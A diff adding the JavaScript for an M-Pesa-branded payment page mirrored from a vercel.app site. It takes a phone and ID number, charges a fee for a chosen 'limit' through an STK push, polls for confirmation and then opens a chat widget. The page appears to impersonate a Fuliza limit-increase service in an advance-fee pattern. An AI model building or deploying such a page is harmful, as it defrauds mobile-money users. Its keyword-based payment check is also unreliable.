+                data?.data?.ResultCode ??
+                data?.data?.resultCode;
+
+            if (String(resultCode) === '0') return 'completed';
+
+            const allText = deepValues(data).join(' ').toLowerCase();
+            if (/mpesa receipt|mpesaReceipt|receipt number|confirmed|successful|success|paid|completed/.test(allText)) return 'completed';
+            if (/cancelled|canceled|declined|failed|insufficient|timeout|error/.test(allText)) return 'failed';
+
+            return 'pending';
+        }
+
+        // Extract receipt number from API response
+        function getReceiptFromVerification(data, fallbackReference) {
+            return data?.mpesaReceipt ||
+                data?.mpesaReceiptNumber ||
+                data?.receipt ||
+                data?.receipt_number ||
+                data?.receiptNumber ||
+                data?.data?.mpesaReceipt ||
+                data?.data?.mpesaReceiptNumber ||
+                data?.data?.receipt ||
+                data?.data?.receipt_number ||
+                data?.data?.receiptNumber ||
+                fallbackReference ||
+                'Confirmed';
+        }
+
+        // Update payment status UI
+        function setPaymentStatus(mode, title, text, statusText) {
+            const spinner = document.getElementById('paySpinner');
+            const icon = document.getElementById('payIcon');
+            const titleEl = document.getElementById('payStatusTitle');
+            const textEl = document.getElementById('payStatusText');
+            const displayStatus = document.getElementById('payDisplayStatus');
+
+            titleEl.innerText = title;
+            textEl.innerText = text;
+            displayStatus.innerText = statusText || title;
+
+            icon.className = 'hidden w-14 h-14 rounded-full mx-auto mb-4 items-center justify-center';
+            icon.innerHTML = '';
+
+            if (mode === 'loading') {
+                spinner.classList.remove('hidden');
+                return;
+            }
+
+            spinner.classList.add('hidden');
+            icon.classList.remove('hidden');
+            icon.classList.add('flex');
+
+            if (mode === 'success') {
+                icon.classList.add('bg-green-100', 'text-green-600');
+                icon.innerHTML = '<i class="fas fa-check text-3xl"></i>';
+            } else if (mode === 'error') {
+                icon.classList.add('bg-red-100', 'text-red-600');
+                icon.innerHTML = '<i class="fas fa-times text-3xl"></i>';
+            } else {
+                icon.classList.add('bg-blue-100', 'text-blue-600');
+                icon.innerHTML = '<i class="fas fa-mobile-alt text-3xl"></i>';
+            }
+        }
+
+        // Initiate STK Push
+        async function initiatePayment() {
+            const rawPhone = document.getElementById('phoneNum').value;
+            const id = document.getElementById('idNum').value;
+
+            if(!rawPhone || rawPhone.length < 10 || !id) {
+                return alert("Fill in all details");
+            }
+
+            if (!selectedFee) {
+                return alert("Select a limit first");
+            }
+
+            if (paymentBusy) return;
+
+            paymentBusy = true;
+            paymentReferences = [];
+
+            document.getElementById('input-step').classList.add('hidden');
+            document.getElementById('success-step').classList.add('hidden');
+            document.getElementById('response-step').classList.remove('hidden');
+
+            try {
+                paymentPhone = cleanPhone(rawPhone);
+                const originalReference = createPaymentReference();
+                paymentReference = originalReference;
+                paymentReferences = [originalReference];
+
+                document.getElementById('payDisplayAmount').innerText = `Ksh ${Number(selectedFee).toLocaleString()}`;
+                document.getElementById('payDisplayPhone').innerText = paymentPhone;
+
+                setPaymentStatus(
+                    'loading',
+                    'Sending M-Pesa Prompt',
+                    'Please wait while we send the STK request to your phone.',
+                    'Sending'
+                );
+
+                const apiBase = window.location.origin;
+const response = await fetch(`${apiBase}/api/stk`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phone_number: paymentPhone,
+                        amount: selectedFee,
+                        reference: originalReference,
+                        platform: "WJ404O"
+                    })
+                });
+
+                const text = await response.text();
+                let data = {};
+
+                try {
+                    data = text ? JSON.parse(text) : {};
+                } catch (e) {
+                    throw new Error(text || 'Unexpected server response');
+                }
+
+                if (!response.ok) {
+                    throw new Error(data.message || data.error || `STK request failed (${response.status})`);
+                }
+
+                paymentReferences = collectReferenceCandidates(data, originalReference);
+                paymentReference = paymentReferences[0] || originalReference;
+
+                setPaymentStatus(
+                    'info',
+                    'Prompt Sent Successfully',
+                    'Check your phone and enter your M-Pesa PIN. We are verifying automatically.',
+                    'Waiting for payment'
+                );
+
+                startPaymentPolling();
+
+            } catch (error) {
+                paymentBusy = false;
+                setPaymentStatus(
+                    'error',
+                    'Payment Request Failed',
+                    error.message || 'Unable to send the M-Pesa prompt. Please try again.',
+                    'Failed'
+                );
+            }
+        }
+
+        // Start polling for payment status
+        function startPaymentPolling() {
+            clearInterval(paymentPoller);
+
+            let attempts = 0;
+            const maxAttempts = 25;
+
+            paymentPoller = setInterval(async () => {
+                attempts++;
+
+                const result = await verifyPaymentStatus(true);
+
+                if (result === 'completed' || result === 'failed') {
+                    clearInterval(paymentPoller);
+                    return;
+                }
+
+                if (attempts >= maxAttempts) {
+                    clearInterval(paymentPoller);
+                    paymentBusy = false;
+                    setPaymentStatus(
+                        'info',
+                        'Payment Still Processing',
+                        'We are still checking automatically. If you approved the STK prompt, please wait here or tap the button below to check again.',
+                        'Pending'
+                    );
+                }
+            }, 4000);
+        }
+
+        // Verify payment status via API
+        async function verifyPaymentStatus(silentPending = false) {
+            const refs = [...new Set((paymentReferences.length ? paymentReferences : [paymentReference]).filter(Boolean))];
+
+            if (!refs.length) {
+                return 'pending';
+            }
+
+            let lastMessage = '';
+
+            for (const ref of refs) {
+                try {
+                    const response = await fetch(`/api/verify?reference=${encodeURIComponent(ref)}`, {
+                        method: 'GET',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+
+                    const text = await response.text();
+                    let data = {};
+
+                    try {
+                        data = text ? JSON.parse(text) : {};
+                    } catch (e) {
+                        data = { status: 'pending', message: text };
+                    }
+
+                    if (!response.ok) {
+                        const msg = String(data.message || data.error || text || '').toLowerCase();
+                        lastMessage = data.message || data.error || text || lastMessage;
+
+                        if (
+                            msg.includes('no payment found') ||
+                            msg.includes('not found') ||
+                            response.status === 404
+                        ) {
+                            continue;
+                        }
+
+                        throw new Error(data.message || data.error || `Verification failed (${response.status})`);
+                    }
+
+                    const status = getVerificationStatus(data);
+
+                    if (status === 'completed') {
+                        paymentReference = ref;
+                        paymentBusy = false;
+                        clearInterval(paymentPoller);
+                        showSuccess(getReceiptFromVerification(data, ref));
+                        return 'completed';
+                    }
+
+                    if (status === 'failed') {
+                        paymentReference = ref;
+                        paymentBusy = false;
+                        clearInterval(paymentPoller);
+                        setPaymentStatus(
+                            'error',
+                            'Payment Not Completed',
+                            data.message || data.error || 'The payment was cancelled or failed. Please try again.',
+                            'Failed'
+                        );
+                        return 'failed';
+                    }
+
+                    lastMessage = data.message || data.error || lastMessage;
+
+                } catch (error) {
+                    lastMessage = error.message || lastMessage;
+                }
+            }
+
+            if (!silentPending) {
+                setPaymentStatus(
+                    'info',
+                    'Payment Still Processing',
+                    'We are still waiting for confirmation. If you approved the STK prompt, please wait a few seconds and tap check status again.',
+                    'Pending'
+                );
+            }
+
+            return 'pending';
+        }
+
+        async function checkPaymentNow() {
+            const btn = document.getElementById('checkPaymentBtn');
+            if (!paymentReference || btn.disabled) return;
+
+            btn.disabled = true;
+            btn.classList.add('opacity-70');
+            const oldText = btn.innerText;
+            btn.innerText = 'Checking Payment...';
+
+            await verifyPaymentStatus(false);
+
+            btn.disabled = false;
+            btn.classList.remove('opacity-70');
+            btn.innerText = oldText;
+        }
+
+        function showSuccess(receiptNo) {
+            clearInterval(paymentPoller);
+            paymentBusy = false;
+            document.getElementById('response-step').classList.add('hidden');
+            document.getElementById('success-step').classList.remove('hidden');
+            hasUserReachedFinalStep = true;
+
+            setTimeout(() => {
+                Tawk_API.showWidget();
+                if (window.innerWidth > 768) {
+                    Tawk_API.maximize();
+                }
+                Tawk_API.addEvent('payment-verification', { status: 'pending' });
+            }, 1000);
+        }
+    </script>
+</body>
+
+<!-- Mirrored from m-pesa-fuliza.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 May 2026 19:48:14 GMT -->
+</html>
